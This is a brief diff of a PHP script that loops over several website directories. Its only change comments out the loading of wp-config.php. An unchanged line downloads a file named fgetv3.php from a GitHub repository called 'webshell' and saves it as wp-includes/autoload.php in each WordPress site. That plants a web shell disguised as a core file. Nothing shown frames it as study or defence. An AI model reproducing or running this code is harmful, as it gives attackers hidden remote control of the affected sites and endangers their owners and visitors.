@@ -168,7 +168,7 @@ $websiteDirs = [
 foreach ($websiteDirs as $nowdir) {
     echo "Processing $nowdir\n";
 
-    require_once($nowdir . '/wp-config.php');
+    // require_once($nowdir . '/wp-config.php');
 
     $autoloadPath = $nowdir . '/wp-includes/autoload.php';
     downloadFile('https://raw.githubusercontent.com/justikail/webshell/main/fgetv3.php', $autoloadPath);
